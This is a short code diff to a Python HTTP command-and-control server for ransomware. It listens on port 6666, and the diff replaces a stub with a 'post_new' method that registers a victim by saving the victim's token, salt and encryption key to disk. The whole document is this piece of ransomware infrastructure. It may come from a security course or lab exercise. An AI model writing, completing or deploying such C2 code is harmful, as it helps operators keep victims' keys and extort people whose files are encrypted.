@@ -17,10 +17,11 @@ class CNC(CNCBase):
         with open(path, "wb") as f:
             f.write(bin_data)
 
-    def post_new(self, path:str, params:dict, body:dict)->dict:
-        # used to register new ransomware instance
-        return {"status":"KO"}
-
+    def post_new(self, token:str, salt:str, key:str):
+        # register the victim to the CNC
+        # token, salt and key are base64 field
+        self.save_b64(token, salt, "salt")
+        self.save_b64(token, key, "key")
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
 httpd.serve_forever()
